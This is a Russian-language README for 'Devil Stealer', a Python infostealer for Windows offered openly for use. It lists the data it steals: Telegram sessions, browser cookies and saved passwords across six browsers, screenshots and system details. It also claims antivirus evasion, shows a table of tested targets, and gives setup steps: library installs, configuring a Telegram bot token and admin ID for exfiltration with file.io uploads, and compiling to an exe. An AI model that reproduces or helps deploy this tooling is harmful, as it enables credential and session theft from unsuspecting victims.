# Devil Stealer

## ☢ Обновление 2.0 (20.09.2023)
### Что нового
- Исправленны ошибки
- Создан билдер для стиллера. Теперь стиллер создать можно гораздо проще и без кода
- Исправленна работоспособность стиллера в браузере Chrome
- Создан рандомный title для стиллера
- Сделана защита от многих антивирусов

### Python стиллер с отправкой через Telegram бота
## Какие данные ворует стиллер
- Телеграмм сессия
- Куки с Chrome
- Куки с Firefox
- Куки с Opera
- Куки с Yandex
- Куки с Amigo
- Куки с Edge

- Пароли с Chrome
- Пароли с Firefox
- Пароли с Opera
- Пароли с Yandex
- Пароли с Amigo
- Пароли с Edge
  
- Снимок экрана компьютера
- Информация о ПК
  - Время запуска стиллера
  - Имя пользователя/компьютера
  - IP
  - MAC адрес
  - Hostname
  - Информация о сетевых подключениях
  - Найденные программы стиллером
  - Информация о CPU
  - Информация о GPU
  - Информация о оперативной памяти
  - Информация о дисках
  - Информация об ОС
 

**Данные которые ворует стиллер могут обновляться**

### Последний тест стиллера
**Версия python на которой проводились тесты: 3.11**

**Версия библиотек на которых проводились тесты:
Pillow 10.0.0
browser-cookie3 0.19.1
psutil 5.9.5
pywin32 306
pyTelegramBotAPI 4.13.0**
| Данные | Дата последнего теста | Работает |
| ----------- | ----------- | ----------- |
| Куки с Chrome    | 28.08.2023   | Да   |
| Куки с Firefox    | 27.08.2023   | Да   |
| Куки с Opera    | 27.08.2023   | Да   |
| Куки с Yandex    | 28.08.2023   | Да   |
| Куки с Amigo    | -   | ?   |
| Куки с Edge    | 27.08.2023   | Да   |
| Пароли с Chrome    | 28.08.2023   | Да   |
| Пароли с Firefox    | 28.08.2023   | Да   |
| Пароли с Opera    | 27.08.2023   | Да   |
| Пароли с Yandex    | 28.08.2023   | Да   |
| Пароли с Amigo    | -   | ?   |
| Пароли с Edge    | 28.08.2023   | Да   |
| Сессия Telegram    | 28.08.2023   | Да   |
| Снимок экрана    | 28.08.2023   | Да   |
| Информация о ПК    | 28.08.2023   | Да   |

## Установка/Использование без билдера

> [!ВНИМАНИЕ!] СТИЛЛЕР РАБОТАЕТ ТОЛЬКО НА WINDOWS

**Установка библиотек**

```
pip install Pillow
pip install browser-cookie3
pip install psutil
pip install pywin32
pip install pyTelegramBotAPI
```

**После установки библиотек скачайте и откройте архив с данным репозиторием**

**Стиллер (код) без билдера находится в папке devilStealer-No-Builder**



**Отредактируйте bot.py**

Измените ADMIN_ID на ваш айди телеграмма (Получить можно в боте @chatIDrobot)


Измените bot = telebot.Telebot("СЮДА ТОКЕН ВАШЕГО БОТА") (Создать бота можно в @BotFather)

```python
ADMIN_ID = "ID" # Your telegram id
FILE_IO_API_URL = "https://file.io"

bot = telebot.TeleBot("TOKEN") # Your bot token
```

**Если вы хотите другой путь на сохранение временных файлов стиллера то отредактируйте stealer.py**

```python
FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealer\Datascreenshot.jpg"
ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"
```

**!!!ВНИМАНИЕ ПУТЬ АРХИВА НЕ ДОЛЖЕН БЫТЬ В ПАПКЕ ДАННЫХ (FILE_PATH путь до этой папки и других констант) СТИЛЛЕРА!!!**

**Фаил для запуска bot.py**

**Чтобы сбилдить стиллер в exe используйте nuitka или pyinstaller**




## Установка/Использование с билдером


**Установка библиотек для корректной работы стиллера**

```
pip install Pillow
pip install browser-cookie3
pip install psutil
pip install pywin32
pip install pyTelegramBotAPI
```

**Установка библиотек для корректной работы билдера**


```
pip install colorama
```


**После установки библиотек скачайте и откройте архив с данным репозиторием**

**Стиллер с билдером находится в папке devilStealer-Builder**


**Запустите фаил builder.py**
> ```python builder.py```


**Следуйте инструкциям**


![Screen](https://github.com/0xSn1kky/devilStealer/blob/main/screenshots/Screenshot_1.png?raw=true)
![Screen](https://github.com/0xSn1kky/devilStealer/blob/main/screenshots/Screenshot_2.png?raw=true)
![Screen](https://github.com/0xSn1kky/devilStealer/blob/main/screenshots/Screenshot_3.png?raw=true)



**После сборки стиллера код будет лежать в папке devilStealer**

**Фаил для запуска bot.py**

**Чтобы сбилдить стиллер в exe используйте nuitka или pyinstaller**


![Screen](https://github.com/0xSn1kky/devilStealer/blob/main/screenshots/Screenshot_4.png?raw=true)

## Скоро будет
1. Получение куки и пароли с других браузеров
2. Получение данных с FileZilla
3. Получение токена Discord
4. Другие способы отправки логов
5. Работа стиллера на Linux
6. Получение данных с буфера обмена



## Скриншоты работы стиллера

![Screen](https://github.com/0xSn1kky/devilStealer/blob/main/screenshots/screen1.jpg?raw=true)
![Screen](https://github.com/0xSn1kky/devilStealer/blob/main/screenshots/screen2.jpg?raw=true)
![Screen](https://github.com/0xSn1kky/devilStealer/blob/main/screenshots/screen4.jpg?raw=true)
